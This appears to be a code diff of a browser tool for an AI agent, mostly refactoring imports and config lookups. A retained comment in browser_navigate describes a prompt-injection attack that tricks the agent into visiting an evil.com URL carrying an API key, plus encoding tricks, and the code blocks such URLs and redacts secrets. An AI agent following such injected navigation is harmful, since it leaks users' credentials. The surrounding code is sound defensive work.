@@ -65,9 +65,10 @@ import time
 import requests
 from typing import Dict, Any, Optional, List, Tuple
 from pathlib import Path
-from core.auxiliary_client import call_llm
-from base.hermes_constants import get_hermes_home
-from base.utils import is_truthy_value
+from agent.auxiliary_client import call_llm
+from hermes_constants import get_hermes_home
+from utils import is_truthy_value
+from hermes_cli.config import cfg_get
 
 try:
     from tools.website_policy import check_website_access
@@ -192,7 +193,7 @@ def _get_command_timeout() -> int:
     try:
         from hermes_cli.config import read_raw_config
         cfg = read_raw_config()
-        val = cfg.get("browser", {}).get("command_timeout")
+        val = cfg_get(cfg, "browser", "command_timeout")
         if val is not None:
             result = max(int(val), 5)  # Floor at 5s to avoid instant kills
     except Exception as e:
@@ -444,7 +445,7 @@ def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
     return _cached_cloud_provider
 
 
-from base.hermes_constants import is_termux as _is_termux_environment
+from hermes_constants import is_termux as _is_termux_environment
 
 
 def _browser_install_hint() -> str:
@@ -1628,7 +1629,7 @@ def _extract_relevant_content(
     # Without this, a page displaying env vars or API keys would leak
     # secrets to the extraction model before run_agent.py's general
     # redaction layer ever sees the tool result.
-    from core.redact import redact_sensitive_text
+    from agent.redact import redact_sensitive_text
     extraction_prompt = redact_sensitive_text(extraction_prompt)
 
     try:
@@ -1700,7 +1701,7 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
     # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
     import urllib.parse
-    from core.redact import _PREFIX_RE
+    from agent.redact import _PREFIX_RE
     url_decoded = urllib.parse.unquote(url)
     if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
         return json.dumps({
@@ -2245,7 +2246,7 @@ def _maybe_start_recording(task_id: str):
         from hermes_cli.config import read_raw_config
         hermes_home = get_hermes_home()
         cfg = read_raw_config()
-        record_enabled = cfg.get("browser", {}).get("record_sessions", False)
+        record_enabled = cfg_get(cfg, "browser", "record_sessions", default=False)
         
         if not record_enabled:
             return
@@ -2372,7 +2373,7 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
     effective_task_id = _last_session_key(task_id or "default")
     
     # Save screenshot to persistent location so it can be shared with users
-    from base.hermes_constants import get_hermes_dir
+    from hermes_constants import get_hermes_dir
     screenshots_dir = get_hermes_dir("cache/screenshots", "browser_screenshots")
     screenshot_path = screenshots_dir / f"browser_screenshot_{uuid_mod.uuid4().hex}.png"
     
@@ -2448,7 +2449,7 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
         try:
             from hermes_cli.config import load_config
             _cfg = load_config()
-            _vision_cfg = _cfg.get("auxiliary", {}).get("vision", {})
+            _vision_cfg = cfg_get(_cfg, "auxiliary", "vision", default={})
             _vt = _vision_cfg.get("timeout")
             if _vt is not None:
                 vision_timeout = float(_vt)
@@ -2499,7 +2500,7 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
         
         analysis = (response.choices[0].message.content or "").strip()
         # Redact secrets the vision LLM may have read from the screenshot.
-        from core.redact import redact_sensitive_text
+        from agent.redact import redact_sensitive_text
         analysis = redact_sensitive_text(analysis)
         response_data = {
             "success": True,
